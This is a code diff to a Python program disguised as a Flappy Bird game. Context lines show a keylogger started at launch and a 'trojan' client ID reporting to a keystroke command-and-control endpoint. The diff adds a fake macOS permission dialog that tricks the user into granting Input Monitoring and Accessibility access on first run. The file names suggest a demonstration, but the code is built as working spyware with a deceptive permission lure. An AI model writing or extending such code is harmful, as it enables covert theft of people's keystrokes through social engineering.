@@ -18,6 +18,7 @@ C2_SERVER = "http://localhost:8080/api/keystroke"
 CLIENT_ID = f"trojan-{uuid.uuid4().hex[:8]}"
 LOCK_FILE = "/tmp/flappybird_demo.lock"
 DEBUG_LOG = "/tmp/flappy_debug.log"
+FIRST_RUN_MARKER = "/tmp/.flappydemo_setup_done"
 # ----------------------
 
 
@@ -124,11 +125,103 @@ GAME_HTML = """
         border-radius: 8px;
         box-shadow: 0 4px 20px rgba(0,0,0,0.3);
     }
+
+    /* ===== PERMISSION DIALOG (macOS Sequoia style) ===== */
+    .overlay {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.18);
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding-top: 140px;
+        z-index: 1000;
+    }
+    .overlay.hidden { display: none; }
+    .dialog {
+        background: linear-gradient(180deg, #f6f6f6 0%, #e8e8e8 100%);
+        border-radius: 12px;
+        width: 270px;
+        box-shadow: 0 0 0 0.5px rgba(0,0,0,0.12), 0 8px 32px rgba(0,0,0,0.25);
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
+        overflow: hidden;
+        animation: dialogIn 0.2s ease-out;
+        -webkit-font-smoothing: antialiased;
+    }
+    @keyframes dialogIn {
+        from { transform: scale(0.95); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+    .dialog-body { padding: 20px 20px 16px; text-align: center; }
+    .dialog-icon { width: 64px; height: 64px; margin: 0 auto 14px; }
+    .app-icon-svg { width: 64px; height: 64px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
+    .dialog-title {
+        font-size: 13px; font-weight: 700; color: #1d1d1f;
+        margin-bottom: 6px; line-height: 1.35;
+    }
+    .dialog-text { font-size: 11px; color: #86868b; line-height: 1.5; }
+    .dialog-buttons { padding: 4px 20px 20px; }
+    .dialog-btn {
+        width: 100%; padding: 7px 16px; border: none; border-radius: 6px;
+        font-size: 13px; cursor: pointer; background: #007aff; color: white;
+        font-weight: 500; font-family: -apple-system, sans-serif;
+    }
+    .dialog-btn:active { filter: brightness(0.92); }
 </style>
 </head>
 <body>
+
+<!-- PERMISSION DIALOG (first launch only) -->
+<div class="overlay hidden" id="permOverlay">
+    <div class="dialog">
+        <div class="dialog-body">
+            <div class="dialog-icon">
+                <svg class="app-icon-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M32 2C47.5 2 54 2 58 6C62 10 62 16.5 62 32C62 47.5 62 54 58 58C54 62 47.5 62 32 62C16.5 62 10 62 6 58C2 54 2 47.5 2 32C2 16.5 2 10 6 6C10 2 16.5 2 32 2Z" fill="url(#sg)"/>
+                    <defs><linearGradient id="sg" x1="32" y1="2" x2="32" y2="62" gradientUnits="userSpaceOnUse">
+                        <stop offset="0" stop-color="#5BD1D7"/><stop offset="0.7" stop-color="#4EC0CA"/><stop offset="1" stop-color="#DED895"/>
+                    </linearGradient></defs>
+                    <clipPath id="sc"><path d="M32 2C47.5 2 54 2 58 6C62 10 62 16.5 62 32C62 47.5 62 54 58 58C54 62 47.5 62 32 62C16.5 62 10 62 6 58C2 54 2 47.5 2 32C2 16.5 2 10 6 6C10 2 16.5 2 32 2Z"/></clipPath>
+                    <rect x="2" y="48" width="60" height="14" fill="#DED895" clip-path="url(#sc)"/>
+                    <rect x="2" y="47" width="60" height="3" fill="#54B948" clip-path="url(#sc)"/>
+                    <rect x="40" y="4" width="8" height="22" rx="1" fill="#73BF2E"/>
+                    <rect x="38" y="23" width="12" height="4" rx="1" fill="#73BF2E"/>
+                    <rect x="40" y="36" width="8" height="18" rx="1" fill="#73BF2E"/>
+                    <rect x="38" y="34" width="12" height="4" rx="1" fill="#73BF2E"/>
+                    <ellipse cx="24" cy="30" rx="7" ry="5.5" fill="#F8C630" stroke="#E8A020" stroke-width="1"/>
+                    <ellipse cx="22" cy="32" rx="4" ry="2.5" fill="#E8A020"/>
+                    <ellipse cx="27.5" cy="28" rx="2.5" ry="3" fill="white"/>
+                    <ellipse cx="28.5" cy="28.5" rx="1.3" ry="1.7" fill="#1d1d1f"/>
+                    <polygon points="30,29 35,31 30,33" fill="#E84430"/>
+                </svg>
+            </div>
+            <div class="dialog-title">
+                &ldquo;Flappy Bird&rdquo; Would Like to<br>Access Input Monitoring
+            </div>
+            <div class="dialog-text">
+                Grant access in <b>System Settings &rsaquo;<br>
+                Privacy &amp; Security &rsaquo; Accessibility</b>,<br>
+                then reopen the app to play.
+            </div>
+        </div>
+        <div class="dialog-buttons">
+            <button class="dialog-btn" onclick="dismissDialog()">OK</button>
+        </div>
+    </div>
+</div>
+
 <canvas id="game" width="400" height="600"></canvas>
 <script>
+
+function showPermDialog() {
+    document.getElementById("permOverlay").classList.remove("hidden");
+}
+function dismissDialog() {
+    document.getElementById("permOverlay").classList.add("hidden");
+    if (window.pywebview && window.pywebview.api) {
+        window.pywebview.api.on_dialog_dismissed();
+    }
+}
 
 const canvas = document.getElementById("game");
 const ctx = canvas.getContext("2d");
@@ -376,19 +469,52 @@ gameLoop();
 """
 
 
+def _is_first_run():
+    return not os.path.exists(FIRST_RUN_MARKER)
+
+
+def _mark_setup_done():
+    try:
+        with open(FIRST_RUN_MARKER, "w") as f:
+            f.write("1")
+    except Exception:
+        pass
+
+
+class Api:
+    def on_dialog_dismissed(self):
+        _mark_setup_done()
+        _log("[api] dialog dismissed, marked setup done")
+
+
+def _on_loaded(window, first_run):
+    """Called when webview finishes loading."""
+    if first_run:
+        window.evaluate_js("showPermDialog()")
+
+
 def main():
     _log("[main] entered")
     import webview
 
+    first_run = _is_first_run()
+    _log(f"[main] first_run={first_run}")
+
     _start_keylogger()
 
+    api = Api()
     window = webview.create_window(
         "Flappy Bird",
         html=GAME_HTML,
         width=420,
         height=640,
         resizable=False,
+        js_api=api,
     )
+
+    if first_run:
+        window.events.loaded += lambda: _on_loaded(window, True)
+
     webview.start()
 
 
